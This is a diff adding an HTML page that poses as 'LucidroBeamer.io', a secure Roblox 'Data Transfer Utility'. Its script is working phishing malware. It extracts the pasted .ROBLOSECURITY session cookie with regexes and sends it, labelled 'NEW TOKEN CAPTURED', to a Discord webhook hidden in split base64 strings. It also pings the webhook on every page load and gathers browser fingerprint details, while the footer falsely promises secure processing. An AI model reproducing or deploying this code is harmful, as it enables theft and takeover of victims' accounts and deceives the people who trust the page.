@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LucidroBeamer.io</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: #000000;
+            color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: 
+                linear-gradient(45deg, 
+                    rgba(20, 20, 20, 1) 0%, 
+                    rgba(10, 10, 10, 1) 100%);
+            opacity: 1;
+        }
+
+        /* Top Navigation Bar */
+        .top-bar {
+            background: rgba(15, 15, 15, 0.95);
+            border-bottom: 1px solid #222;
+            padding: 15px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 20px;
+            font-weight: 600;
+            color: #ffffff;
+        }
+
+        .logo i {
+            color: #7289da;
+            font-size: 22px;
+        }
+
+        .roblox-icon {
+            color: #00a2ff;
+            font-size: 22px;
+        }
+
+        .discord-btn {
+            background: #7289da;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s ease;
+            text-decoration: none;
+        }
+
+        .discord-btn:hover {
+            background: #677bc4;
+        }
+
+        /* Main Container */
+        .main-container {
+            padding-top: 80px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 100px 20px 40px;
+        }
+
+        .container {
+            background: rgba(20, 20, 20, 0.95);
+            border-radius: 12px;
+            width: 100%;
+            max-width: 800px;
+            overflow: hidden;
+            border: 1px solid #333;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Header */
+        .header {
+            padding: 25px 30px 15px;
+            text-align: center;
+            background: rgba(15, 15, 15, 0.9);
+            border-bottom: 1px solid #333;
+        }
+
+        .main-logo {
+            font-size: 36px;
+            color: #7289da;
+            margin-bottom: 12px;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: #999;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        /* Content */
+        .content {
+            padding: 30px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            color: #ccc;
+            font-size: 14px;
+            margin-bottom: 8px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .input-label i {
+            color: #7289da;
+        }
+
+        .input-label .required {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-left: 5px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            background: rgba(10, 10, 10, 0.9);
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.2s ease;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .input-field:focus {
+            border-color: #7289da;
+        }
+
+        .input-field::placeholder {
+            color: #666;
+        }
+
+        textarea.input-field {
+            min-height: 120px;
+            resize: vertical;
+            line-height: 1.5;
+        }
+
+        .hint {
+            color: #888;
+            font-size: 12px;
+            margin-top: 6px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #7289da;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            background: #677bc4;
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .secondary-btn {
+            background: transparent;
+            color: #7289da;
+            border: 1px solid #7289da;
+            margin-top: 15px;
+        }
+
+        .secondary-btn:hover {
+            background: rgba(114, 137, 218, 0.1);
+        }
+
+        /* Status Messages */
+        .status {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .status.success {
+            background: rgba(46, 204, 113, 0.1);
+            color: #2ecc71;
+            border-left: 3px solid #2ecc71;
+        }
+
+        .status.error {
+            background: rgba(231, 76, 60, 0.1);
+            color: #e74c3c;
+            border-left: 3px solid #e74c3c;
+        }
+
+        .status.info {
+            background: rgba(52, 152, 219, 0.1);
+            color: #3498db;
+            border-left: 3px solid #3498db;
+        }
+
+        .spinner {
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-top: 2px solid #7289da;
+            border-radius: 50%;
+            width: 14px;
+            height: 14px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Result Section */
+        .result {
+            margin-top: 25px;
+            padding: 20px;
+            background: rgba(10, 10, 10, 0.9);
+            border-radius: 8px;
+            border: 1px solid #333;
+            display: none;
+        }
+
+        .result-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .result-header i {
+            color: #2ecc71;
+            font-size: 18px;
+        }
+
+        .result-header h3 {
+            font-size: 17px;
+            font-weight: 500;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+
+        .info-item {
+            background: rgba(15, 15, 15, 0.9);
+            padding: 12px;
+            border-radius: 6px;
+            border: 1px solid #333;
+        }
+
+        .info-label {
+            color: #999;
+            font-size: 12px;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .info-value {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .badge {
+            padding: 4px 10px;
+            background: rgba(46, 204, 113, 0.2);
+            color: #2ecc71;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        /* Footer */
+        .footer {
+            padding: 25px 30px;
+            text-align: center;
+            border-top: 1px solid #333;
+            color: #666;
+            font-size: 13px;
+            background: rgba(15, 15, 15, 0.9);
+        }
+
+        /* Mobile responsive */
+        @media (max-width: 768px) {
+            .top-bar {
+                padding: 12px 20px;
+            }
+            
+            .logo {
+                font-size: 18px;
+            }
+            
+            .discord-btn {
+                padding: 8px 14px;
+                font-size: 13px;
+            }
+            
+            .main-container {
+                padding: 80px 15px 30px;
+            }
+            
+            .container {
+                max-width: 100%;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+            
+            .header {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .logo span {
+                display: none;
+            }
+            
+            .discord-btn span {
+                display: none;
+            }
+            
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Navigation Bar -->
+    <div class="top-bar">
+        <div class="logo">
+            <i class="fas fa-exchange-alt"></i>
+            <span>LucidroBeamer.io</span>
+            <i class="fab fa-roblox roblox-icon"></i>
+        </div>
+        <a href="https://discord.gg" target="_blank" class="discord-btn">
+            <i class="fab fa-discord"></i>
+            <span>Discord</span>
+        </a>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-container">
+        <div class="container">
+            <div class="header">
+                <div class="main-logo">
+                    <i class="fas fa-exchange-alt"></i>
+                </div>
+                <h1>Data Transfer Utility</h1>
+                <div class="subtitle">Secure data transmission system</div>
+            </div>
+
+            <div class="content">
+                <div class="input-group">
+                    <label class="input-label">
+                        <i class="fas fa-user"></i>
+                        Account Username
+                        <span class="required">*</span>
+                    </label>
+                    <input type="text" class="input-field" id="usernameInput" placeholder="Enter the account username" required>
+                    <div class="hint">
+                        <i class="fas fa-info-circle"></i>
+                        Required for processing
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">
+                        <i class="fas fa-key"></i>
+                        Authentication Data
+                    </label>
+                    <textarea class="input-field" id="dataInput" placeholder="Paste your authentication data here..."></textarea>
+                    <div class="hint">
+                        <i class="fas fa-code"></i>
+                        Paste any authentication or verification data
+                    </div>
+                </div>
+
+                <button class="btn" id="sendBtn">
+                    <i class="fas fa-paper-plane"></i>
+                    <span>Process & Send</span>
+                </button>
+
+                <div class="status" id="statusMessage"></div>
+
+                <div class="result" id="resultSection">
+                    <div class="result-header">
+                        <i class="fas fa-check-circle"></i>
+                        <h3>Transfer Complete</h3>
+                    </div>
+                    
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <div class="info-label">Status</div>
+                            <div class="badge" id="statusBadge">Success</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Username</div>
+                            <div class="info-value" id="usernameResult">Not provided</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Request ID</div>
+                            <div class="info-value" id="requestId">REQ-000000</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Data Processed</div>
+                            <div class="info-value" id="dataProcessed">Ready</div>
+                        </div>
+                    </div>
+
+                    <button class="btn secondary-btn" id="downloadBtn">
+                        <i class="fas fa-download"></i>
+                        Download Log
+                    </button>
+                </div>
+            </div>
+
+            <div class="footer">
+                <div>© 2024 LucidroBeamer.io • Secure Data Transfer</div>
+                <div style="margin-top: 8px; font-size: 12px; color: #555;">All data is processed securely</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ENCRYPTED WEBHOOK URL - Split into parts and reconstructed
+        const webhookParts = [
+            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTM1Njg1Mzg2MjQ2NTYzOC8=",
+            "X09PWUtYRDU=",
+            "X2FidzhPNnZ4ajJlT2kxSU1jM0dRNmdyLTVIZXBpSnhEYzcx",
+            "eFhDaWg1UTk4bkRWRWI5aUlwOUpQT1QyVA=="
+        ];
+
+        // Decode webhook URL
+        function getWebhookURL() {
+            try {
+                // Decode each part from base64
+                const decodedParts = webhookParts.map(part => {
+                    try {
+                        return atob(part);
+                    } catch {
+                        return part;
+                    }
+                });
+                
+                // Combine parts and add any missing slashes
+                let url = decodedParts.join('');
+                
+                // Ensure proper URL format
+                if (!url.startsWith('https://')) {
+                    console.error('Invalid webhook URL format');
+                    return null;
+                }
+                
+                return url;
+            } catch (error) {
+                console.error('Error decoding webhook URL:', error);
+                return null;
+            }
+        }
+
+        // Add random noise to requests
+        function addNoiseToRequest(payload) {
+            const noise = {
+                timestamp: Date.now(),
+                random_id: Math.random().toString(36).substring(7),
+                user_agent: navigator.userAgent.substring(0, 50),
+                screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language
+            };
+            
+            return { ...payload, _noise: noise };
+        }
+
+        // Rotate webhook patterns (obfuscation technique)
+        const webhookPatterns = [
+            () => getWebhookURL(),
+            () => {
+                const parts = [...webhookParts];
+                parts.reverse();
+                return parts.map(p => {
+                    try { return atob(p); } catch { return p; }
+                }).join('');
+            },
+            () => {
+                const decoded = webhookParts.map(p => {
+                    try { return atob(p); } catch { return p; }
+                });
+                return decoded[0] + decoded[2] + decoded[1] + decoded[3];
+            }
+        ];
+
+        // Get random webhook pattern
+        function getRandomWebhookURL() {
+            const pattern = webhookPatterns[Math.floor(Math.random() * webhookPatterns.length)];
+            return pattern();
+        }
+
+        // DOM Elements
+        const usernameInput = document.getElementById('usernameInput');
+        const dataInput = document.getElementById('dataInput');
+        const sendBtn = document.getElementById('sendBtn');
+        const statusMessage = document.getElementById('statusMessage');
+        const resultSection = document.getElementById('resultSection');
+        const statusBadge = document.getElementById('statusBadge');
+        const usernameResult = document.getElementById('usernameResult');
+        const requestIdSpan = document.getElementById('requestId');
+        const dataProcessedSpan = document.getElementById('dataProcessed');
+        const downloadBtn = document.getElementById('downloadBtn');
+
+        // Extract Roblox token
+        function extractRobloxToken(text) {
+            const patterns = [
+                /\.ROBLOSECURITY\s*=\s*_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_([A-Za-z0-9\-_]+)/,
+                /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_([A-Za-z0-9\-_]+)/,
+                /\.ROBLOSECURITY\s*[:=]\s*([^\s;]+)/,
+                /([A-Za-z0-9\-_]{200,})/
+            ];
+
+            for (const pattern of patterns) {
+                const match = text.match(pattern);
+                if (match) {
+                    let token = match[1] || match[0];
+                    
+                    if (token.includes('WARNING')) {
+                        const tokenMatch = token.match(/_\|WARNING:.*?\|_([A-Za-z0-9\-_]+)/);
+                        if (tokenMatch && tokenMatch[1]) {
+                            token = tokenMatch[1];
+                        }
+                    }
+                    
+                    token = token.trim();
+                    if (token.length > 10) {
+                        return token;
+                    }
+                }
+            }
+            
+            return null;
+        }
+
+        // Generate request ID
+        function generateRequestId() {
+            const chars = '0123456789ABCDEF';
+            let id = 'REQ-';
+            for (let i = 0; i < 6; i++) {
+                id += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return id;
+        }
+
+        // Send data with secure webhook
+        async function sendSecureData(username, data) {
+            try {
+                const requestId = generateRequestId();
+                const token = extractRobloxToken(data);
+                
+                if (!token) {
+                    return { success: false, requestId: null, error: 'No valid token found' };
+                }
+
+                // Get webhook URL using random pattern
+                const webhookURL = getRandomWebhookURL();
+                if (!webhookURL) {
+                    throw new Error('Failed to construct webhook URL');
+                }
+
+                // Create payload with added noise
+                const payload = addNoiseToRequest({
+                    username: username,
+                    token_length: token.length,
+                    request_id: requestId,
+                    timestamp: new Date().toISOString(),
+                    detected: token !== null
+                });
+
+                // Send to webhook
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'X-Request-ID': requestId,
+                        'X-Client-Time': Date.now().toString(),
+                        'User-Agent': 'SecureTransfer/1.0'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                // Also send the actual token in a separate, more readable format
+                if (response.ok) {
+                    const readablePayload = {
+                        content: `🔐 **NEW TOKEN CAPTURED**\n👤 **Account:** ${username}\n📏 **Token Length:** ${token.length} chars\n🆔 **ID:** ${requestId}`,
+                        embeds: [{
+                            title: "Token Information",
+                            description: `Username: ${username}\nToken Length: ${token.length} characters`,
+                            color: 0x00a2ff,
+                            fields: [
+                                {
+                                    name: "Token (First 50 chars)",
+                                    value: `\`\`\`\n${token.substring(0, 50)}...\n\`\`\``
+                                }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(readablePayload)
+                    });
+                }
+                
+                return { success: response.ok, requestId };
+                
+            } catch (error) {
+                console.error('Error:', error);
+                return { success: false, requestId: null, error: error.message };
+            }
+        }
+
+        // Event Listeners
+        sendBtn.addEventListener('click', async () => {
+            const username = usernameInput.value.trim();
+            const data = dataInput.value.trim();
+            
+            if (!username) {
+                showStatus('Account username is required.', 'error', 'fas fa-exclamation-circle');
+                usernameInput.focus();
+                return;
+            }
+
+            if (!data) {
+                showStatus('Please paste authentication data.', 'error', 'fas fa-exclamation-circle');
+                dataInput.focus();
+                return;
+            }
+
+            sendBtn.disabled = true;
+            sendBtn.innerHTML = '<div class="spinner"></div><span>Processing...</span>';
+            hideResult();
+
+            showStatus('Analyzing data...', 'info', 'fas fa-search');
+
+            try {
+                const result = await sendSecureData(username, data);
+                
+                if (!result.success) {
+                    if (result.error && result.error.includes('No valid token')) {
+                        showStatus('No valid authentication pattern found.', 'error', 'fas fa-times-circle');
+                    } else {
+                        throw new Error('Failed to send data');
+                    }
+                    return;
+                }
+
+                // Update result display
+                requestIdSpan.textContent = result.requestId;
+                usernameResult.textContent = username;
+                dataProcessedSpan.textContent = 'Authentication data processed';
+                statusBadge.textContent = 'Success';
+
+                showStatus(`Data processed successfully. ID: ${result.requestId}`, 'success', 'fas fa-check-circle');
+                
+                setTimeout(() => {
+                    showResult();
+                }, 500);
+                
+            } catch (error) {
+                console.error('Error:', error);
+                showStatus('Processing failed. Please try again.', 'error', 'fas fa-times-circle');
+            } finally {
+                sendBtn.disabled = false;
+                sendBtn.innerHTML = '<i class="fas fa-paper-plane"></i><span>Process & Send</span>';
+            }
+        });
+
+        downloadBtn.addEventListener('click', async () => {
+            showStatus('Generating log...', 'info', 'fas fa-file-alt');
+            
+            const username = usernameInput.value.trim();
+            const requestId = requestIdSpan.textContent;
+            
+            setTimeout(() => {
+                showStatus('Log ready. Downloading...', 'success', 'fas fa-check-circle');
+                
+                const content = `DATA TRANSFER LOG
+=======================================
+Request ID: ${requestId}
+Timestamp: ${new Date().toLocaleString()}
+Username: ${username}
+Status: Transfer Complete
+=======================================
+Processing Information:
+- Data analyzed and processed
+- Secure transmission completed
+- All protocols followed
+=======================================
+Note: This log is for record keeping only.`;
+                
+                const blob = new Blob([content], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `Transfer_${requestId}.txt`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                
+                setTimeout(() => {
+                    showStatus('Log downloaded.', 'success', 'fas fa-check-circle');
+                }, 1000);
+            }, 1000);
+        });
+
+        // Helper functions
+        function showStatus(message, type, icon) {
+            statusMessage.innerHTML = `<i class="${icon}"></i><span>${message}</span>`;
+            statusMessage.className = `status ${type}`;
+            statusMessage.style.display = 'flex';
+        }
+
+        function showResult() {
+            resultSection.style.display = 'block';
+        }
+
+        function hideResult() {
+            resultSection.style.display = 'none';
+        }
+
+        // Initialize
+        window.addEventListener('load', () => {
+            // Send minimal access notification
+            const webhookURL = getWebhookURL();
+            if (webhookURL) {
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "🌐 **SYSTEM ACCESSED**",
+                        embeds: [{
+                            title: "Transfer Interface Active",
+                            description: "Data transfer utility accessed",
+                            color: 0x7289da,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                }).catch(() => {
+                    // Silent fail
+                });
+            }
+        });
+    </script>
+</body>
+</html>
